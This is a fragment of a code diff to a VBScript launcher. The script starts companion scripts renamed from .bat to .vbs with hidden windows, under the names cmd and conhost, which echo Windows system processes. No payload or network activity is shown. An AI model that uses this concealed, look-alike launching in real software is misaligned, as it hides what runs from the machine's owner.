@@ -33,14 +33,14 @@ SafeLaunch batchCommand, 0
 
 WScript.Sleep 2000
 
-' 2. Launch cmd.bat - Hidden
-cmdCommand = chr(34) & scriptDir & "\cmd.bat" & chr(34)
+' 2. Launch cmd.vbs - Hidden
+cmdCommand = chr(34) & scriptDir & "\cmd.vbs" & chr(34)
 SafeLaunch cmdCommand, 0
 
 WScript.Sleep 1000
 
-' 3. Launch conhost.bat - Hidden
-conhostCommand = chr(34) & scriptDir & "\conhost.bat" & chr(34)
+' 3. Launch conhost.vbs - Hidden
+conhostCommand = chr(34) & scriptDir & "\conhost.vbs" & chr(34)
 SafeLaunch conhostCommand, 0
 
 Set FSO = Nothing
